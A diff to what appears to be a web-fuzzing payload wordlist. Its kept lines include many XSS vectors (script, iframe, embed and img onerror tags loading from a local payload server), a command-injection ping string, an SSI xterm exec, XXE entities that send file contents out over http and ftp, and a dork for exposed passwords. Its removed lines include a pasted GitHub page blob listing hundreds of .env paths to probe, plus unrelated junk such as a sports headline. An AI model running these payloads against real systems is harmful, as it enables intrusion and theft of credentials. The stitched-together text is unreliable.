@@ -1,4 +1,3 @@
-[01;34mkubernetes[0m
 "& ping -i 30 127.0.0.1 &"
 "'dsn: mysql:host=localhost;dbname=" ext:yml | ext:txt "password:"
 "+onmouseover="window.location='http://localhost'
@@ -20,16 +19,11 @@
 "><div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/x.html));">
 "><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
 "><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>?
-"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
 "><embed src="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></embed>
 "><iframe src="http://127.0.0.1:3555/xss_serve_payloads/x.html" width="800" height="800">iframe</iframe>
 "><iframe src=http://127.0.0.1:3555/xss_serve_payloads/x.html <
 "><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/x.gif!x.html></iframe>
 "><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/x.html!x.html></iframe>
-"><img src = �http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp�>
-"><img src = �http://127.0.0.1:3555/xss_serve_payloads/x.js�>
-"><img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>
-"><img src = ”http://127.0.0.1:3555/xss_serve_payloads/x.js”>
 "><img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
 "><img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
 "><img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>
@@ -125,16 +119,11 @@ $sitepreview/localhost:2006/wizard/
 '><div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/x.html));">
 '><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
 '><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>?
-'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
 '><embed src="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></embed>
 '><iframe src="http://127.0.0.1:3555/xss_serve_payloads/x.html" width="800" height="800">iframe</iframe>
 '><iframe src=http://127.0.0.1:3555/xss_serve_payloads/x.html <
 '><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/x.gif!x.html></iframe>
 '><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/x.html!x.html></iframe>
-'><img src = �http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp�>
-'><img src = �http://127.0.0.1:3555/xss_serve_payloads/x.js�>
-'><img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>
-'><img src = ”http://127.0.0.1:3555/xss_serve_payloads/x.js”>
 '><img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
 '><img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
 '><img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>
@@ -3164,9 +3153,6 @@ $sitepreview/localhost:2006/wizard/
 /mno/api/v1/telcoproperties/internal
 /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= postguestbook
 /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= postguestbook 0.6.1
-/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= postguestbook”
-/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= “postguestbook 0.6.1”
-/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= “postguestbook”
 /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir=xxpathxx?
 /monitorix-cgi/monitorix.cgi?mode=localhost&graph=all&when=1day
 /notification/notification-anon/internal/phone
@@ -4167,7 +4153,6 @@ $sitepreview/localhost:2006/wizard/
 :localhost::80
 <!--#exec cmd=""/usr/x11r6/bin/xterm ?display 127.0.0.1:0 &""-->
 <!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;
-<!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;
 <!entity % param3 "<!entity &#x25; exfil system 'ftp://127.0.0.1:21/%data3;'>">
 <<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script
 <<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/x.js></script
@@ -4224,10 +4209,6 @@ $sitepreview/localhost:2006/wizard/
 <iframe src=http://127.0.0.1:3555/xss_serve_payloads/x.html <
 <iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/x.gif!x.html></iframe>
 <iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/x.html!x.html></iframe>
-<img src = �http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp�>
-<img src = �http://127.0.0.1:3555/xss_serve_payloads/x.js�>
-<img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>
-<img src = ”http://127.0.0.1:3555/xss_serve_payloads/x.js”>
 <img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
 <img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
 <img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>
@@ -4264,7 +4245,6 @@ $sitepreview/localhost:2006/wizard/
 <script a=`>` src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></script>
 <script a=`>` src="http://127.0.0.1:3555/xss_serve_payloads/x.js"></script>
 <script id=xss src=http://127.0.0.1></script>
-<script type="application/json" data-target="react-app.embeddeddata">{"payload":{"allshortcutsenabled":false,"filetree":{"":{"items":[{"name":"403_header_payloads.txt","path":"403_header_payloads.txt","contenttype":"file"},{"name":"403_url_payloads.txt","path":"403_url_payloads.txt","contenttype":"file"},{"name":"readme.md","path":"readme.md","contenttype":"file"},{"name":"sql.txt","path":"sql.txt","contenttype":"file"},{"name":"admin.txt","path":"admin.txt","contenttype":"file"},{"name":"adminer.txt","path":"adminer.txt","contenttype":"file"},{"name":"all-files-leaked.txt","path":"all-files-leaked.txt","contenttype":"file"},{"name":"all_attacks.txt","path":"all_attacks.txt","contenttype":"file"},{"name":"all_fuzz.txt","path":"all_fuzz.txt","contenttype":"file"},{"name":"allsqli.txt","path":"allsqli.txt","contenttype":"file"},{"name":"android_all_permissions.txt","path":"android_all_permissions.txt","contenttype":"file"},{"name":"apac.txt","path":"apac.txt","contenttype":"file"},{"name":"api.txt","path":"api.txt","contenttype":"file"},{"name":"aspx.txt","path":"aspx.txt","contenttype":"file"},{"name":"backup_files_only.txt","path":"backup_files_only.txt","contenttype":"file"},{"name":"bambda.txt","path":"bambda.txt","contenttype":"file"},{"name":"blindsqli.txt","path":"blindsqli.txt","contenttype":"file"},{"name":"cgi-bin.txt","path":"cgi-bin.txt","contenttype":"file"},{"name":"cgi-files.txt","path":"cgi-files.txt","contenttype":"file"},{"name":"coffin@wp-fuzz.txt","path":"coffin@wp-fuzz.txt","contenttype":"file"},{"name":"config.txt","path":"config.txt","contenttype":"file"},{"name":"crlf.txt","path":"crlf.txt","contenttype":"file"},{"name":"directory_traversal.txt","path":"directory_traversal.txt","contenttype":"file"},{"name":"directory_traversal_unix.txt","path":"directory_traversal_unix.txt","contenttype":"file"},{"name":"directory_traversal_win.txt","path":"directory_traversal_win.txt","contenttype":"file"},{"name":"env.txt","path":"env.txt","contenttype":"file"},{"name":"everything.txt","path":"everything.txt","contenttype":"file"},{"name":"extensions.txt","path":"extensions.txt","contenttype":"file"},{"name":"fuzz.txt","path":"fuzz.txt","contenttype":"file"},{"name":"fuzz_php_special.txt","path":"fuzz_php_special.txt","contenttype":"file"},{"name":"git_config.txt","path":"git_config.txt","contenttype":"file"},{"name":"htaccess","path":"htaccess","contenttype":"file"},{"name":"iis.txt","path":"iis.txt","contenttype":"file"},{"name":"jsf.txt","path":"jsf.txt","contenttype":"file"},{"name":"jsp.txt","path":"jsp.txt","contenttype":"file"},{"name":"juicy-paths.txt","path":"juicy-paths.txt","contenttype":"file"},{"name":"juicy_files.txt","path":"juicy_files.txt","contenttype":"file"},{"name":"jwt-secrets.txt","path":"jwt-secrets.txt","contenttype":"file"},{"name":"kibana.txt","path":"kibana.txt","contenttype":"file"},{"name":"lfi.txt","path":"lfi.txt","contenttype":"file"},{"name":"onelistforallmicro.txt","path":"onelistforallmicro.txt","contenttype":"file"},{"name":"onelistforallshort.txt","path":"onelistforallshort.txt","contenttype":"file"},{"name":"param.txt","path":"param.txt","contenttype":"file"},{"name":"params.txt","path":"params.txt","contenttype":"file"},{"name":"phpmyadmin.txt","path":"phpmyadmin.txt","contenttype":"file"},{"name":"pl.txt","path":"pl.txt","contenttype":"file"},{"name":"robots.txt","path":"robots.txt","contenttype":"file"},{"name":"sqldb.txt","path":"sqldb.txt","contenttype":"file"},{"name":"sqli2.txt","path":"sqli2.txt","contenttype":"file"},{"name":"ssrf.txt","path":"ssrf.txt","contenttype":"file"},{"name":"ssti.txt","path":"ssti.txt","contenttype":"file"},{"name":"wordpress-random.txt","path":"wordpress-random.txt","contenttype":"file"},{"name":"wp-content.txt","path":"wp-content.txt","contenttype":"file"},{"name":"xml.txt","path":"xml.txt","contenttype":"file"},{"name":"xor.txt","path":"xor.txt","contenttype":"file"},{"name":"xss.txt","path":"xss.txt","contenttype":"file"},{"name":"xsspollygots.txt","path":"xsspollygots.txt","contenttype":"file"},{"name":"xsswafbypss.txt","path":"xsswafbypss.txt","contenttype":"file"},{"name":"zip.txt","path":"zip.txt","contenttype":"file"}],"totalcount":59}},"filetreeprocessingtime":4.695844,"folderstofetch":[],"repo":{"id":837590532,"defaultbranch":"main","name":"payloads","ownerlogin":"coffinxp","currentusercanpush":false,"isfork":false,"isempty":false,"createdat":"2024-08-03t12:27:09.000z","owneravatar":"https://avatars.githubusercontent.com/u/177080559?v=4","public":true,"private":false,"isorgowned":false},"codelinewrapenabled":false,"symbolsexpanded":false,"treeexpanded":true,"refinfo":{"name":"main","listcachekey":"v0:1722688127.0","canedit":false,"reftype":"branch","currentoid":"bb8feaa2127965909d53d6190ba2a6309469c979"},"path":"env.txt","currentuser":null,"blob":{"rawlines":["/__tests__/test-become/.env","/_static/.env","/.c9/metadata/environment/.env","/.docker/.env","/.docker/laravel/app/.env","/.env","/.env.backup","/.env.dev","/.env.development.local","/.env.docker.dev","/.env.example","/.env.local","/.env.php","/.env.prod","/.env.production.local","/.env.sample.php","/.env.save","/.env.stage","/.env.test","/.env.test.local","/.env~","/.gitlab-ci/.env","/.vscode/.env","/3-sequelize/final/.env","/07-accessing-data/begin/vue-heroes/.env","/07-accessing-data/end/vue-heroes/.env","/08-routing/begin/vue-heroes/.env","/08-routing/end/vue-heroes/.env","/09-managing-state/begin/vue-heroes/.env","/09-managing-state/end/vue-heroes/.env","/31_structure_tests/.env","/acme_challenges/.env","/acme-challenge/.env","/acme/.env","/actions-server/.env","/admin-app/.env","/admin/.env","/adminer/.env","/administrator/.env","/agora/.env","/alpha/.env","/anaconda/.env","/api/.env","/api/src/.env","/app_dir/.env","/app_nginx_static_path/.env","/app-order-client/.env","/app/.env","/app/client/.env","/app/code/community/nosto/tagging/.env","/app/config/.env","/app/config/dev/.env","/app/frontend/.env","/app1-static/.env","/app2-static/.env","/apps/.env","/apps/client/.env","/archipel/.env","/asset_img/.env","/assets/.env","/assignment3/.env","/assignment4/.env","/audio/.env","/awstats/.env","/babel-plugin-dotenv/test/fixtures/as-alias/.env","/babel-plugin-dotenv/test/fixtures/default/.env","/babel-plugin-dotenv/test/fixtures/dev-env/.env","/babel-plugin-dotenv/test/fixtures/empty-values/.env","/babel-plugin-dotenv/test/fixtures/filename/.env","/babel-plugin-dotenv/test/fixtures/override-value/.env","/babel-plugin-dotenv/test/fixtures/prod-env/.env","/back-end/app/.env","/back/.env","/backend/.env","/backend/src/.env","/backendfinaltest/.env","/backup/.env","/base_dir/.env","/basic-network/.env","/bgoldd/.env","/bitcoind/.env","/blankon/.env","/blob/.env","/blog/.env","/blue/.env","/bookchain-client/.env","/bootstrap/.env","/boxes/oracle-vagrant-boxes/containerregistry/.env","/boxes/oracle-vagrant-boxes/kubernetes/.env","/boxes/oracle-vagrant-boxes/olcne/.env","/bucoffea/.env","/build/.env","/cardea/backend/.env","/cdw-backend/.env","/cgi-bin/.env","/ch2-mytodo/.env","/ch6-mytodo/.env","/ch6a-mytodo/.env","/ch7-mytodo/.env","/ch7a-mytodo/.env","/ch8-mytodo/.env","/ch8a-mytodo/.env","/ch8b-mytodo/.env","/chai/.env","/challenge/.env","/challenges/.env","/charts/liveobjects/.env","/chat-client/.env","/chiminey/.env","/client-app/.env","/client/.env","/client/mutual-fund-app/.env","/client/src/.env","/clientapp/.env","/clld_dir/.env","/cmd/testdata/expected/dot_env/.env","/code/api/.env","/code/web/.env","/codegolf.web/clientapp/.env","/codenames-frontend/.env","/collab-connect-web-application/server/.env","/collected_static/.env","/community/.env","/conf/.env","/config/.env","/containerregistry/.env","/content/.env","/core/.env","/core/app/.env","/core/datavase/.env","/core/persistence/.env","/core/src/main/resources/org/jobrunr/dashboard/frontend/.env","/counterblockd/.env","/counterwallet/.env","/cp/.env","/cron/.env","/cronlab/.env","/cryo_project/.env","/css/.env","/custom/.env","/d/.env","/data/.env","/database/.env","/dataset1/.env","/dataset2/.env","/default/.env","/delivery/.env","/demo-app/.env","/demo/.env","/deploy/.env","/developerslv/.env","/development/.env","/directories/.env","/dist/.env","/django_project_path/.env","/django-blog/.env","/django/.env","/doc/.env","/docker-compose/platform/.env","/docker-elk/.env","/docker-network-healthcheck/.env","/docker-node-mongo-redis/.env","/docker/.env","/docker/app/.env","/docker/compose/withmongo/.env","/docker/compose/withpostgres/.env","/docker/database/.env","/docker/db/.env","/docker/examples/compose/.env","/docker/postgres/.env","/docker/webdav/.env","/docs/.env","/dodoswap-client/.env","/dotfiles/.env","/download/.env","/downloads/.env","/e2e/.env","/en/.env","/engine/.env","/env/.env","/env/dockers/mariadb-test/.env","/env/dockers/php-apache/.env","/env/example/.env","/env/template/.env","/environments/local/.env","/environments/production/.env","/error/.env","/errors/.env","/example/.env","/example02-golang-package/import-underscore/.env","/example27-how-to-load-env/sample01/.env","/example27-how-to-load-env/sample02/.env","/examples/.env","/examples/01-simple-model/.env","/examples/02-complex-example/.env","/examples/03-one-to-many-relationship/.env","/examples/04-many-to-many-relationship/.env","/examples/05-migrations/.env","/examples/06-base-service/.env","/examples/07-feature-flags/.env","/examples/08-performance/.env","/examples/09-production/.env","/examples/10-subscriptions/.env","/examples/11-transactions/.env","/examples/drupal-separate-services/.env","/examples/react-dashboard/backend/.env","/examples/sdl-first/.env","/examples/sdl-first/prisma/.env","/examples/vue-dashboard/backend/.env","/examples/web/.env","/examples/with-cookie-auth-fauna/.env","/examples/with-dotenv/.env","/examples/with-firebase-authentication-serverless/.env","/examples/with-react-relay-network-modern/.env","/examples/with-relay-modern/.env","/examples/with-universal-configuration-build-time/.env","/exapi/.env","/exercise.frontend/.env","/exercise.frontend/train/.env","/export/.env","/fastlane/.env","/favicons/.env","/favs/.env","/fe/huey/.env","/fedex/.env","/fhir-api/.env","/files/.env","/fileserver/.env","/films/.env","/final_project/airflow_dag/.env","/final_project/kafka_twitter/.env","/final_project/startingfile/.env","/finalversion/lcomernbootcamp/projbackend/.env","/first_config/.env","/first-network/.env","/fisdom/fisdom/.env","/fixtures/blocks/.env","/fixtures/fiber-debugger/.env","/fixtures/flight/.env","/fixtures/kitchensink/.env","/flask_test_uploads/.env","/fm/.env","/font-icons/.env","/fonts/.env","/front-app/.env","/front-empathy/.env","/front-end/.env","/front/.env","/front/src/.env","/frontend/.env","/frontend/momentum-fe/.env","/frontend/react/.env","/frontend/vue/.env","/frontendfinaltest/.env","/ftp/.env","/ftpmaster/.env","/gists/cache","/gists/laravel","/gists/pusher","/github-connect/.env","/grems-api/.env","/grems-frontend/.env","/hash/.env","/hasura/.env","/helmetjs/.env","/hgs-static/.env","/higlass-website/.env","/home/.env","/horde/.env","/hotpot-app-frontend/.env","/htdocs/.env","/html/.env","/http/.env","/httpboot/.env","/huniv_migration/.env","/icon/.env","/icons/.env","/ikiwiki/.env","/image_data/.env","/imagebord/.env","/images/.env","/img/.env","/install/.env","/instantcv/server/.env","/items/.env","/javascript/.env","/js-plugin/.env","/js/.env","/jsrelay/.env","/jupyter/.env","/khanlinks/.env","/kibana/.env","/kodenames-server/.env","/kolab-syncroton/.env","/kubernetes/.env","/lab/.env","/laravel/.env","/latest/.env","/layout/.env","/lcomernbootcamp/projbackend/.env","/leafer-app/.env","/ledger_sync/.env","/legacy/tests/9.1.1","/legacy/tests/9.2.0","/legal/.env","/lemonldap-ng-doc/.env","/lemonldap-ng-fr-doc/.env","/letsencrypt/.env","/lib/.env","/library/.env","/libs/.env","/linux/.env","/local/.env","/log/.env","/logging/.env","/login/.env","/mail/.env","/mailinabox/.env","/mailman/.env","/main_user/.env","/main/.env","/manual/.env","/master/.env","/media/.env","/memcached/.env","/mentorg-lava-docker/.env","/micro-app-react-communication/.env","/micro-app-react/.env","/mindsweeper/gui/.env","/minified/.env","/misc/.env","/modix/clientapp/.env","/monerod/.env","/mongodb/config/dev/.env","/monitoring/compose/.env","/moodledata/.env","/msks/.env","/munki_repo/.env","/music/.env","/myrentals.web/clientapp/.env","/name/.env","/new-js/.env","/news-app/.env","/nginx-server/.env","/nginx/.env","/niffler-frontend/.env","/node_modules/.env","/nodejs-projects/play-ground/login/.env","/nodejs-projects/play-ground/manageuserroles/.env","/novnc/.env","/nuke.app.ui/.env","/oldsanta/.env","/ops/vagrant/.env","/option/.env","/orientdb-client/.env","/outputs/.env","/owncloud/.env","/packages/api/.env","/packages/app/.env","/packages/client/.env","/packages/frontend/.env","/packages/plugin-analytics/src/fixtures/analytics-ga-key/.env","/packages/plugin-qiankun/examples/app1/.env","/packages/plugin-qiankun/examples/app2/.env","/packages/plugin-qiankun/examples/app3/.env","/packages/plugin-qiankun/examples/master/.env","/packages/react-scripts/fixtures/kitchensink/template/.env","/packages/styled-ui-docs/.env","/packages/web/.env","/packed/.env","/page-editor/.env","/parity/.env","/passportjs/.env","/patchwork/.env","/path/.env","/pfbe/.env","/pictures/.env","/playground/.env","/plugin_static/.env","/post-deployment/.vscode/.env","/postfixadmin/.env","/price_hawk_client/.env","/prisma/.env","/private/.env","/processor/.env","/prod/.env","/projbackend/.env","/project_root/.env","/psnlink/.env","/pt2/countries/src/.env","/pt8/library-backend-gql/.env","/pub/.env","/public_html/.env","/public_root/.env","/public/.env","/question2/.env","/qv-frontend/.env","/rabbitmq-cluster/.env","/rails-api/react-app/.env","/rasax/.env","/react_todo/.env","/redmine/.env","/repo/.env","/repos/.env","/repository/.env","/resources/.env","/resources/docker/.env","/resources/docker/mysql/.env","/resources/docker/phpmyadmin/.env","/resources/docker/rabbitmq/.env","/resources/docker/rediscommander/.env","/resourcesync/.env","/rest/.env","/restapi/.env","/results/.env","/robots/.env","/root/.env","/rosterback/.env","/roundcube/.env","/roundcubemail/.env","/routes/.env","/run/.env","/rust-backend/.env","/rust-backend/dao/.env","/s-with-me-front/.env","/saas/.env","/samples/chatroom/chatroom-spa/.env","/samples/docker/deploymentscripts/.env","/script/.env","/scripts/.env","/scripts/fvt/.env","/selfish-darling-backend/.env","/serve_time_server/.env","/serve-browserbench/.env","/server_with_db/.env","/server/.env","/server/config/.env","/server/laravel/.env","/server/src/persistence/.env","/services/adminer/.env","/services/deployment-agent/.env","/services/documents/.env","/services/graylog/.env","/services/jaeger/.env","/services/minio/.env","/services/monitoring/.env","/services/portainer/.env","/services/redis-commander/.env","/services/registry/.env","/services/simcore/.env","/services/traefik/.env","/sessions/.env","/shared/.env","/shibboleth/.env","/shop/.env","/simple_server/.env","/site-library/.env","/site/.env","/sitemaps/.env","/sites/.env","/sitestatic/.env","/socketio/.env","/sources/.env","/sources/api/.env","/spearmint/.env","/spikes/config-material-app/.env","/spotiapps/.env","/src/__tests__/__fixtures__/instancewithdependentsteps/.env","/src/__tests__/__fixtures__/typescriptintegrationproject/.env","/src/__tests__/__fixtures__/typescriptproject/.env","/src/__tests__/__fixtures__/typescriptvisualizeproject/.env","/src/.env","/src/add-auth/express/.env","/src/assembly/.env","/src/character-service/.env","/src/client/mobile/.env","/src/core/tests/dotenv-files/.env","/src/gameprovider-service/.env","/src/main/front-end/.env","/src/main/resources/archetype-resources/__rootartifactid__-acceptance-test/src/test/resources/app-launcher-tile/.env","/src/renderer/.env","/srv6_controller/controller/.env","/srv6_controller/examples/.env","/srv6_controller/node-manager/.env","/st-js-be-2020-movies-two/.env","/stackato-pkg/.env","/static_prod/.env","/static_root/.env","/static_user/.env","/static-collected/.env","/static-html/.env","/static-root/.env","/static/.env","/staticfiles/.env","/stats/.env","/storage/.env","/style/.env","/styles/.env","/stylesheets/.env","/symfony/.env","/system-config/.env","/system/.env","/target/.env","/temanr9/.env","/temanr10/.env","/temp/.env","/template/.env","/templates/.env","/test-network/.env","/test-network/addorg3/.env","/test/.env","/test/aries-js-worker/fixtures/.env","/test/bdd/fixtures/adapter-rest/.env","/test/bdd/fixtures/agent-rest/.env","/test/bdd/fixtures/couchdb/.env","/test/bdd/fixtures/demo/.env","/test/bdd/fixtures/demo/openapi/.env","/test/bdd/fixtures/did-method-rest/.env","/test/bdd/fixtures/did-rest/.env","/test/bdd/fixtures/edv-rest/.env","/test/bdd/fixtures/openapi-demo/.env","/test/bdd/fixtures/sidetree-mock/.env","/test/bdd/fixtures/universalresolver/.env","/test/bdd/fixtures/vc-rest/.env","/test/fixtures/.env","/test/fixtures/app_types/node/.env","/test/fixtures/app_types/rails/.env","/test/fixtures/node_path/.env","/test/integration/env-config/app/.env","/testfiles/.env","/testing/docker/.env","/tests/.env","/tests/application/.env","/tests/default_settings/v7.0/.env","/tests/default_settings/v8.0/.env","/tests/default_settings/v9.0/.env","/tests/default_settings/v10.0/.env","/tests/default_settings/v11.0/.env","/tests/default_settings/v12.0/.env","/tests/default_settings/v13.0/.env","/tests/drupal-test/.env","/tests/integration/environment/.env","/tests/todo-react/.env","/testwork_json/.env","/theme_static/.env","/theme/.env","/thumb/.env","/thumbs/.env","/tiedostot/.env","/tmp/.env","/tools/.env","/travel_form/.env","/ts/prime/.env","/ubuntu/.env","/ui/.env","/unixtime/.env","/unsplash-downloader/.env","/upfiles/.env","/upload/.env","/uploads/.env","/urlmem-app/.env","/user_info/.env","/v1/.env","/v2/.env","/var/backup/.env","/vendor/.env","/vendor/github.com/gobuffalo/envy/.env","/vendor/github.com/subosito/gotenv/.env","/videos/.env","/vm-docker-compose/.env","/vod_installer/.env","/vue_crm/.env","/vue-end/vue-til/.env","/vue/vuecli/.env","/web-dist/.env","/web/.env","/web/sitemariage/.env","/webroot_path/.env","/websocket/.env","/webstatic/.env","/webui/.env","/well-known/.env","/whturk/.env","/windows/tests/9.2.x/.env","/windows/tests/9.3.x/.env","/wp-content/.env","/www-data/.env","/www/.env","/xx-final/vue-heroes/.env","/zmusic-frontend/.env"],"stylingdirectives":[[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[]],"colorizedlines":null,"csv":null,"csverror":null,"dependabotinfo":{"showconfigurationbanner":false,"configfilepath":null,"networkdependabotpath":"/coffinxp/payloads/network/updates","dismissconfigurationnoticepath":"/settings/dismiss-notice/dependabot_configuration_notice","configurationnoticedismissed":null},"displayname":"env.txt","displayurl":"https://github.com/coffinxp/payloads/blob/main/env.txt?raw=true","headerinfo":{"blobsize":"12.1 kb","deletetooltip":"you must be signed in to make or propose changes","edittooltip":"you must be signed in to make or propose changes","ghdesktoppath":"https://desktop.github.com","isgitlfs":false,"onbranch":true,"shortpath":"a775b7c","sitenavloginpath":"/login?return_to=https%3a%2f%2fgithub.com%2fcoffinxp%2fpayloads%2fblob%2fmain%2fenv.txt","iscsv":false,"isrichtext":false,"toc":null,"lineinfo":{"truncatedloc":"590","truncatedsloc":"590"},"mode":"file"},"image":false,"iscodeownersfile":null,"isplain":false,"isvalidlegacyissuetemplate":false,"issuetemplate":null,"discussiontemplate":null,"language":"text","languageid":372,"large":false,"plansupportinfo":{"repoisfork":null,"repoownedbycurrentuser":null,"requestfullpath":"/coffinxp/payloads/blob/main/env.txt","showfreeorggatedfeaturemessage":null,"showplansupportbanner":null,"upgradedataattributes":null,"upgradepath":null},"publishbannersinfo":{"dismissactionnoticepath":"/settings/dismiss-notice/publish_action_from_dockerfile","releasepath":"/coffinxp/payloads/releases/new?marketplace=true","showpublishactionbanner":false},"rawbloburl":"https://github.com/coffinxp/payloads/raw/refs/heads/main/env.txt","renderimageorraw":false,"richtext":null,"renderedfileinfo":null,"shortpath":null,"symbolsenabled":true,"tabsize":8,"topbannersinfo":{"overridingglobalfundingfile":false,"globalpreferredfundingpath":null,"showinvalidcitationwarning":false,"citationhelpurl":"https://docs.github.com/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","actionsonboardingtip":null},"truncated":false,"viewable":true,"workflowredirecturl":null,"symbols":{"timed_out":false,"not_analyzed":true,"symbols":[]}},"copilotinfo":null,"copilotaccessallowed":false,"modelsaccessallowed":false,"csrf_tokens":{"/coffinxp/payloads/branches":{"post":"1ig-isapnhvymd_uexuy3aatiisbt5lx05igt9a8ndelkdl5d9hm_bpcr7i7mn6flw8sagdycvqzt9lsyejj-a"},"/repos/preferences":{"post":"jh_ueuppizlpwvoim43gpbqnrqul7s-cuy9nxvj-rujb3gztimqqkqqkeshxl7z676z9ws9wct0klj1f3hoh4a"}}},"title":"payloads/env.txt at main · coffinxp/payloads","apppayload":{"helpurl":"https://docs.github.com","findfileworkerpath":"/assets-cdn/worker/find-file-worker-7d7eb7c71814.js","findinfileworkerpath":"/assets-cdn/worker/find-in-file-worker-96e76d5fdb2c.js","githubdevurl":null,"enabled_features":{"code_nav_ui_events":false,"overview_shared_code_dropdown_button":false,"react_blob_overlay":false,"copilot_smell_icebreaker_ux":true,"accessible_code_button":true}}}</script>
 <script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/x.html","_self");</script>
 <script+a=">'>" src="http://localhost"></script>
 <script>document.write("<scri");</script>pt src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></script>
@@ -14085,7 +14065,6 @@ explanation	internal server error.
 explanation	internal web container error.
 explanation	this is an internal system error and is probably caused by an earlier failure.
 explanation	this is an unexpected internal error.
-exploit description: using an embed tag you can embed a flash movie that contains xss. if you add the attributes allowscriptaccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to jonathan vanasco for the info). demo: http://ha.ckers.org/weird/xssflash.html :
 explorer-central-internal
 explorer-internal
 exportinternalformregistrationsdata
@@ -15158,7 +15137,6 @@ getuserinternalarticles
 gfc-internals.texi
 ggc-internal.h
 gh.internal
-giants “internally considering” trading down from 11th pick — report
